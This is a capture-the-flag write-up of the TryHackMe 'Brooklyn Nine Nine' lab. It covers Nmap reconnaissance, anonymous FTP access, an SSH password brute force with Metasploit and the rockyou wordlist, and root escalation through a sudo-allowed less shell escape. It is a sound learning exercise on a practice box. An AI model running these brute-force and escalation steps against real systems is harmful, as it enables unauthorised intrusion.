# Brooklyn Nine Nine — TryHackMe CTF Writeup

This room is aimed at beginner level hackers, but anyone can try to hack this box. There are two main intended ways to root the box.

## Lab Information

- **Platform:** TryHackMe
- **Target:** Brooklyn Nine Nine
- **Target IP:** `10.113.167.64`
- **Difficulty:** Easy
- **Attack Vector:** Anonymous FTP → SSH Brute Force → Sudo Privilege Escalation
- **Objective:** Obtain the user and root flags.

## 1. Reconnaissance — Nmap

First, I used Nmap to identify open ports, services, and service versions on the target machine.

```
nmap -sC -sV -Pn -T4 <TARGET_IP> -oN nmap.txt

Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 11:32 -0400
Nmap scan report for 10.113.167.64
Host is up (0.071s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.128.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Scan Results

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21/tcp | FTP | vsftpd 3.0.3 | Anonymous login allowed |
| 22/tcp | SSH | OpenSSH 7.6p1 | Remote access |
| 80/tcp | HTTP | Apache 2.4.29 | Web server |

### Initial Assessment

The most interesting finding was that anonymous FTP login was enabled. The Nmap output also revealed a file named `note_to_jake.txt` accessible through FTP.

## 2. FTP Enumeration — Anonymous Access

I connected to the FTP service using the anonymous account. After logging in, I found the file `note_to_jake.txt`, downloaded it using the `get` command, and read its contents.

### Analysis

The note revealed two potentially useful usernames:

- `jake`
- `amy`

More importantly, it suggested that Jake's password might be weak. I decided to investigate whether the SSH service could be accessed using a weak password. I created a file named `users.txt` containing the usernames:

```bash
echo -e "jake\namy" > users.txt
```

## 3. SSH Brute Force — Metasploit

Based on the information found in the FTP note, I attempted to identify Jake's password using Metasploit's SSH login scanner.

```
msf6 > search ssh_login
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS <TARGET_IP>
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/ssh/ssh_login) > run

[+] Success: 'jake:987654321'
```

The weak password hint led to a valid SSH login for Jake. This step demonstrated how information gathered during enumeration can guide credential attacks — an exposed username combined with a weak password allowed access to the target system.

## 4. SSH Access — User Flag

With the credentials obtained in the previous step, I connected to the target using SSH.

```bash
ssh jake@<TARGET_IP>
```

After logging in, I enumerated the available home directories.

```
jake@brooklyn99:~$ ls /home
amy  holt  jake
```

I navigated to Holt's home directory.

```
jake@brooklyn99:~$ cd /home/holt
jake@brooklyn99:/home/holt$ ls
nano.save  user.txt
jake@brooklyn99:/home/holt$ cat user.txt
[REDACTED]
```

### Analysis

Although I logged in as Jake, I was able to read the `user.txt` file located in Holt's home directory. This illustrates why permissions and access controls should be examined during post-exploitation enumeration.

## 5. Privilege Escalation — Sudo Enumeration

After obtaining the user flag, I investigated whether Jake had any privileges that could allow me to escalate to root.

```
jake@brooklyn99:~$ sudo -l

User jake may run the following commands:
    (ALL) NOPASSWD: /usr/bin/less
```

### Analysis

The output indicated that Jake could execute `/usr/bin/less` as any user, including root, without entering a password. `less` is normally a terminal-based file viewer; however, under certain configurations it can execute shell commands. This made the sudo permission a potential privilege escalation vector.

## 6. Root Privilege Escalation — Less Shell Escape

I used the permitted `less` binary to open `/etc/profile` with root privileges.

```bash
sudo /usr/bin/less /etc/profile
```

Once inside `less`, I ran a shell escape:

```
!/bin/bash
```

This launched a Bash shell with the privileges inherited from the root-executed process. To verify the current user:

```
root@brooklyn99:~# whoami
root
```

Privilege escalation successful.

### Why Did This Work?

The important factor was not a vulnerability in the operating system kernel. Instead, Jake had been granted passwordless sudo access to a program capable of invoking a shell. Because `less` was running with root privileges, the shell it launched also ran with root privileges. This is an example of privilege escalation caused by an overly permissive sudo configuration (see [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/)).

## 7. Root Flag

After obtaining root access, I navigated to the root user's directory and read `root.txt`.

```
root@brooklyn99:~# cat /root/root.txt
[REDACTED]
```

## 8. Attack Path Summary

```
Nmap Enumeration
       |
       v
Anonymous FTP Access
       |
       v
Read note_to_jake.txt
       |
       v
Identify Usernames: jake, amy
       |
       v
SSH Password Brute Force
       |
       v
Obtain Jake's Credentials
       |
       v
SSH Login
       |
       v
Read User Flag
       |
       v
sudo -l
       |
       v
Identify NOPASSWD: /usr/bin/less
       |
       v
Less Shell Escape
       |
       v
Root Access
       |
       v
Read Root Flag
```

## 9. Lessons Learned

**Enumeration**
- Identified open ports and running services using Nmap.
- Discovered anonymous FTP access.
- Used an exposed file to identify usernames and obtain a password hint.

**Credential Attacks**
- Used Metasploit's `auxiliary/scanner/ssh/ssh_login` module.
- Learned how weak passwords can expose SSH accounts to brute-force attacks.
- Understood the importance of using strong, unique passwords.

**Linux Post-Exploitation**
- Enumerated home directories after gaining SSH access.
- Checked sudo permissions using `sudo -l`.
- Identified an unsafe sudo permission involving `less`.

**Privilege Escalation**
- Exploited the `less` shell-escape functionality.
- Obtained a root shell without exploiting a kernel vulnerability.
- Learned why unrestricted sudo permissions for interactive programs can be dangerous.
